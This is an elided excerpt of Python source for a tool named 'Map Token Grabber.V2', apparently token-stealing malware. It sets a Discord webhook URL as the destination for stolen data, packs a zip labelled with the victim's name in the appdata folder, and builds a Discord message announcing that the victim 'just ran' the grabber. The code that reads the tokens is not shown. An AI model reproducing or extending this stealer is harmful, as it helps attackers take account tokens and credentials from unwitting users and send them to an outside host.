...
config = {
    'webhook': "https://discord.com/api/webhooks/1503490230035157033/YsvIRvkXif4lL-8PsSyDNELERWmXuFwb-N0-U4HJl3Tt8cQmzJmBZM36CvVymm_yXavY",
...
class MapGrabber(functions):
    ...
    def finish(self):
        ...
        _zipfile = os.path.join(
            self.appdata, f'MapGrabber.V2-[{Victim}].zip')
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran Map Token Grabber.V2',
                        'url': '',
                        'icon_url': ''
                    },
                    'color': 16119101,
